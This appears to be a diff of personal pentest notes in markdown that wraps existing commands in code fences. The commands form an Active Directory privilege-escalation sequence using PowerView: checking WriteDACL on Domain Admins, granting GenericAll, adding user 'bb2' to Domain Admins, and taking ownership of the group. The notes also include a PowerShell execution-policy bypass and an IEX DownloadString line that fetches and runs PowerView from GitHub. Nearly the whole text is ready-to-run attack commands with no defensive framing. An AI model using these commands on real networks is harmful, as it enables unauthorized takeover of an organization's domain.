@@ -68,16 +68,19 @@ Get-Command -Module PowerView
 - Note: (If blocked by execution policy, run: Set-ExecutionPolicy Bypass -Scope Process -Force first)
 
 - Verify if 'bb2' has WriteDACL on Domain Admins
-
+```bash
 Get-DomainObjectAcl -Identity "Domain Admins" | Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser "bb2").SID } | Select-Object ActiveDirectoryRights
-
+```
 - Add GenericAll permission
+```bash
 Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "bb2" -Rights All -Verbose
-
+```
 - Add your account to the group
+```bash
 Add-DomainGroupMember -Identity "Domain Admins" -Members "bb2" -Verbose
-
+```
 - Verify
+```bash
 Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName
 ```
 
@@ -91,16 +94,17 @@ $Group.Add("LDAP://CN=master,CN=Users,DC=bank,DC=local")
 ### 3. with permissions - ✔ modify owner is only enabled
 ```bash
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
-
-or downloade the script and run by import
-
+```
+-or downloade the script and run by import
+```bash
 powershell -ep bypass
 Import-Module .\powerview.ps1
 
 Get-Command Set-DomainObjectOwner, Add-DomainObjectAcl
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
-
+```
+```bash
 - 1. Take ownership
 Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "usermad" -Verbose
 
